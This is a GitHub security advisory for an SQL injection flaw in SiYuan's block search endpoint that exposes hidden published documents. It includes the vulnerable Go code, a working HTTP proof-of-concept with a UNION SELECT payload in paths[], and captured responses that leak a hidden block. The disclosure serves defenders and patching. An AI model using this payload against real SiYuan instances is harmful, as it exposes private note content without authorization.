# [H] SiYuan: SQL Query in Block Search Exposes Hidden Published Document Content

## Summary
Severity: High
Advisory: GHSA-h89q-4j2h-7h88
CVE: CVE-2026-59834
CWE: CWE-89
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-09-02
Source: https://github.com/advisories/GHSA-h89q-4j2h-7h88
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260704035518-d0f0fe146fb0

## Details
## Summary

Siyuan's block search endpoint concatenates attacker-controlled `paths[]` values into SQL predicates used by non-SQL search modes. Through Siyuan's publish service, an unauthenticated visitor is forwarded to the kernel with a reader-role token and can reach `POST /api/search/fullTextSearchBlock`.

An attacker can inject a `UNION SELECT` through `paths[]` and return rows from hidden documents while projecting an allowed visible `box` and `path`. The post-query publish access filter trusts the projected `box` and `path`, so the injected hidden row is returned to the publish visitor.

## Affected Code

The API blocks explicit SQL search mode for non-admin users, but allows other search methods to use caller-controlled paths:

```go
if method == 2 && !model.IsAdminRoleContext(c) {
    ret.Code = -1
    ret.Msg = "SQL search requires administrator privileges"
    return
}

blocks, matchedBlockCount, matchedRootCount, pageCount, docMode := model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)
if model.IsReadOnlyRoleContext(c) {
    publishAccess := model.GetPublishAccess()
    blocks = model.FilterBlocksByPublishAccess(c, publishAccess, blocks)
}
```

Source: `input/siyuan/kernel/api/search.go`

`paths[]` is parsed into notebook IDs and paths without SQL escaping or validation:

```go
path := p.(string)
box := strings.TrimSpace(strings.Split(path, "/")[0])
if "" != box {
    boxes = append(boxes, box)
}
path = strings.TrimSpace(strings.TrimPrefix(path, box))
if "" != path {
    paths = append(paths, path)
}
```

Source: `input/siyuan/kernel/api/search.go`

Those values are then concatenated directly into SQL:

```go
builder.WriteString(fmt.Sprintf("box = '%s'", box))
```

```go
builder.WriteString(fmt.Sprintf("path LIKE '%s%%'", path))
```

Source: `input/siyuan/kernel/model/search.go`

Regexp search executes the resulting statement:

```go
stmt := "SELECT * FROM `blocks` WHERE " + fieldFilter + " AND type IN " + typeFilter
stmt += boxFilter + pathFilter + ignoreFilter + " " + orderBy
blocks := sql.SelectBlocksRegex(stmt, regex, Conf.Search.Name, Conf.Search.Alias, Conf.Search.Memo, Conf.Search.IAL, page, pageSize)
```

Source: `input/siyuan/kernel/model/search.go`

The read-only publish filter runs after SQL execution and trusts the returned row's `Box` and `Path`:

```go
for _, block := range blocks {
    passwordID, password := GetPathPasswordByPublishAccess(block.Box, block.Path, publishAccess)
    if CheckPathAccessableByPublishIgnore(block.Box, block.Path, publishIgnore) && (c == nil || password == "" || CheckPublishAuthCookie(c, passwordID, password)) {
        ret = append(ret, block)
    }
}
```

Source: `input/siyuan/kernel/model/publish_access.go`

## Attack Scenario

1. A Siyuan instance enables the publish service.
2. At least one document is visible to publish visitors.
3. At least one document is hidden from publish visitors.
4. The attacker sends a crafted `paths[]` value to the publish service's `/api/search/fullTextSearchBlock` endpoint.
5. The injected SQL selects content from the hidden document while projecting the visible document's `box` and `path`.
6. Siyuan returns the hidden block because the post-query publish filter checks the projected visible path.

## Proof of Concept

```http
POST /api/search/fullTextSearchBlock HTTP/1.1
Host: <publish-service-host>
Content-Type: application/json

{
  "query": "SECRET-LIVE-SQLI-20260609",
  "method": 3,
  "page": 1,
  "pageSize": 10,
  "paths": [
    "VISIBLE_NOTEBOOK_ID/x%') UNION SELECT id,parent_id,root_id,hash,'VISIBLE_NOTEBOOK_ID','/VISIBLE_DOC.sy',hpath,name,alias,memo,tag,content,fcontent,markdown,length,type,subtype,ial,sort,created,updated FROM blocks WHERE path='/HIDDEN_DOC.sy' -- "
  ]
}
```

`VISIBLE_NOTEBOOK_ID` and `/VISIBLE_DOC.sy` must reference content that the publish visitor can access. `/HIDDEN_DOC.sy` is the hidden document to read.

## Validation

Setup:

- Started `b3log/siyuan:latest` with an isolated temporary workspace.
- Created one notebook.
- Created a visible document containing `public apple marker`.
- Created a hidden document containing `SECRET-LIVE-SQLI-20260609 apple marker`.
- Marked the hidden document invisible with `POST /api/filetree/setPublishAccess`.
- Enabled publish mode with `POST /api/setting/setPublish`.
- Sent all exploit traffic through the publish service, which forwards requests with a reader-role token.

Control request through the publish service for the hidden marker returned no blocks:

```json
{
  "code": 0,
  "msg": "",
  "data": {
    "blocks": [],
    "docMode": false,
    "matchedBlockCount": 1,
    "matchedRootCount": 1,
    "pageCount": 1
  }
}
```

The injected request through the publish service returned the hidden block:

```json
{
  "code": 0,
  "msg": "",
  "data": {
    "blocks": [
      {
        "box": "20260609095146-19hud1e",
        "path": "/20260609095209-1ljs6o7.sy",
        "hPath": "/HiddenDoc",
        "id": "20260609095209-gttlrue",
        "rootID": "20260609095209-yaz7i3h",
        "parentID": "20260609095209-yaz7i3h",
        "content": "<mark>SECRET-LIVE-SQLI-20260609</mark> apple marker",
        "markdown": "SECRET-LIVE-SQLI-20260609 apple marker",
        "type": "NodeParagraph"
      }
    ],
    "docMode": false,
    "matchedBlockCount": 0,
    "matchedRootCount": 0,
    "pageCount": 0
  }
}
```

The returned row contains content from the hidden document, but its projected `box` and `path` point to the visible document. That is why the publish access filter accepts it.

## Impact

An unauthenticated publish visitor can read hidden document block content from the `blocks` table. This bypasses Siyuan's publish visibility controls and exposes private note content that is not available through normal published document or search requests.


## Remediation

Build notebook and path predicates with bound SQL parameters instead of string concatenation. For example:

```sql
box = ?
path LIKE ?
```

Then pass the user-controlled notebook ID and path prefix as query arguments.

Additional hardening:

- Validate notebook IDs before query construction.
- Validate document paths against Siyuan's normalized `.sy` path format.
- Apply publish visibility restrictions before or inside SQL execution, rather than relying only on post-query filtering of returned row projections.
- Add regression tests for publish reader-role requests where `paths[]` contains SQL metacharacters such as `'`, `)`, `UNION`, and `--`.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-h89q-4j2h-7h88
- https://nvd.nist.gov/vuln/detail/CVE-2026-59834
- https://github.com/siyuan-note/siyuan/commit/57bcad4b331836880bfe6be25d4180bdcf10db0d
- https://github.com/siyuan-note/siyuan/commit/d0f0fe146fb07d594fcadc4f48d4f7c30ac01d1e
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.7.1
